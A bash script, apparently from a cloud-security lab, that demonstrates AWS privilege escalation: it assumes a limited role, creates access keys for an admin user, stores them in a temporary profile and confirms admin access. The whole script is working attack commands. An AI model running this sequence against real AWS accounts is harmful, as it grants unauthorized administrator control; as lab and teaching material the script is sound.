#!/bin/bash

# Demo script for iam:CreateAccessKey privilege escalation
# This script demonstrates how a role with CreateAccessKey permission can escalate to admin

set -e

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Configuration
PROFILE="prod"
STARTING_USER="pl-pathfinder-starting-user-prod"
PRIVESC_ROLE="pl-cak-adam"
ADMIN_USER="pl-cak-admin"
TEMP_CREDS_FILE="/tmp/pl-cak-temp-creds.json"
TEMP_PROFILE="pl-cak-temp-admin"

echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}IAM CreateAccessKey Privilege Escalation Demo${NC}"
echo -e "${GREEN}========================================${NC}\n"

# Step 1: Verify starting user identity
echo -e "${YELLOW}Step 1: Verifying identity as starting user${NC}"
CURRENT_USER=$(aws sts get-caller-identity --profile $PROFILE --query 'Arn' --output text)
echo "Current identity: $CURRENT_USER"

if [[ ! $CURRENT_USER == *"$STARTING_USER"* ]]; then
    echo -e "${RED}Error: Not running as $STARTING_USER${NC}"
    echo "Please configure your AWS CLI profile '$PROFILE' to use the starting user credentials"
    exit 1
fi
echo -e "${GREEN}✓ Verified starting user identity${NC}\n"

# Step 2: Get account ID
echo -e "${YELLOW}Step 2: Getting account ID${NC}"
ACCOUNT_ID=$(aws sts get-caller-identity --profile $PROFILE --query 'Account' --output text)
echo "Account ID: $ACCOUNT_ID"
echo -e "${GREEN}✓ Retrieved account ID${NC}\n"

# Step 3: Assume the privilege escalation role
echo -e "${YELLOW}Step 3: Assuming role $PRIVESC_ROLE${NC}"
ROLE_ARN="arn:aws:iam::${ACCOUNT_ID}:role/${PRIVESC_ROLE}"
echo "Role ARN: $ROLE_ARN"

CREDENTIALS=$(aws sts assume-role \
    --role-arn $ROLE_ARN \
    --role-session-name demo-attack-session \
    --profile $PROFILE \
    --query 'Credentials' \
    --output json)

export AWS_ACCESS_KEY_ID=$(echo $CREDENTIALS | jq -r '.AccessKeyId')
export AWS_SECRET_ACCESS_KEY=$(echo $CREDENTIALS | jq -r '.SecretAccessKey')
export AWS_SESSION_TOKEN=$(echo $CREDENTIALS | jq -r '.SessionToken')

# Verify we're now the role
ROLE_IDENTITY=$(aws sts get-caller-identity --query 'Arn' --output text)
echo "Current identity: $ROLE_IDENTITY"
echo -e "${GREEN}✓ Successfully assumed role${NC}\n"

# Step 4: Check current permissions (should be limited)
echo -e "${YELLOW}Step 4: Testing current permissions${NC}"
echo "Attempting to list S3 buckets (should fail)..."
if aws s3 ls 2>&1 | grep -q "AccessDenied\|operation: Access Denied"; then
    echo -e "${GREEN}✓ Confirmed limited permissions (cannot list S3 buckets)${NC}"
else
    echo -e "${YELLOW}Warning: Unexpected permissions${NC}"
fi
echo ""

# Step 5: Create access keys for the admin user
echo -e "${YELLOW}Step 5: Creating access keys for admin user $ADMIN_USER${NC}"
echo "This is the privilege escalation vector..."

NEW_ACCESS_KEY=$(aws iam create-access-key \
    --user-name $ADMIN_USER \
    --output json)

NEW_ACCESS_KEY_ID=$(echo $NEW_ACCESS_KEY | jq -r '.AccessKey.AccessKeyId')
NEW_SECRET_ACCESS_KEY=$(echo $NEW_ACCESS_KEY | jq -r '.AccessKey.SecretAccessKey')

echo "Created new access key: $NEW_ACCESS_KEY_ID"
echo -e "${GREEN}✓ Successfully created access keys for admin user${NC}\n"

# Save credentials for cleanup
echo "$NEW_ACCESS_KEY" > $TEMP_CREDS_FILE

# Step 6: Configure temporary profile with new admin credentials
echo -e "${YELLOW}Step 6: Configuring temporary AWS profile with new admin credentials${NC}"
aws configure set aws_access_key_id $NEW_ACCESS_KEY_ID --profile $TEMP_PROFILE
aws configure set aws_secret_access_key $NEW_SECRET_ACCESS_KEY --profile $TEMP_PROFILE
aws configure set region us-east-1 --profile $TEMP_PROFILE

echo -e "${GREEN}✓ Configured temporary profile: $TEMP_PROFILE${NC}\n"

# Step 7: Verify admin access
echo -e "${YELLOW}Step 7: Verifying administrator access with new credentials${NC}"
ADMIN_IDENTITY=$(aws sts get-caller-identity --profile $TEMP_PROFILE --query 'Arn' --output text)
echo "New identity: $ADMIN_IDENTITY"

# Test admin permissions
echo "Testing admin permissions (listing IAM users)..."
IAM_USERS=$(aws iam list-users --profile $TEMP_PROFILE --query 'Users[*].UserName' --output text | head -5)
echo "Successfully listed IAM users: $IAM_USERS"
echo -e "${GREEN}✓ Confirmed administrator access!${NC}\n"

# Summary
echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}Attack Summary${NC}"
echo -e "${GREEN}========================================${NC}"
echo -e "Starting Point: User ${YELLOW}$STARTING_USER${NC}"
echo -e "Step 1: Assumed role ${YELLOW}$PRIVESC_ROLE${NC}"
echo -e "Step 2: Created access keys for ${YELLOW}$ADMIN_USER${NC}"
echo -e "Step 3: Gained ${RED}Administrator Access${NC}"
echo ""
echo -e "${YELLOW}Attack Path:${NC}"
echo -e "  $STARTING_USER → (AssumeRole) → $PRIVESC_ROLE → (CreateAccessKey) → $ADMIN_USER → Admin"
echo ""
echo -e "${RED}IMPORTANT: Run cleanup_attack.sh to remove the created access keys${NC}"
echo -e "${RED}Access Key ID to delete: $NEW_ACCESS_KEY_ID${NC}"
echo ""

# Cleanup instructions
echo -e "${YELLOW}To clean up:${NC}"
echo "  ./cleanup_attack.sh"
echo ""

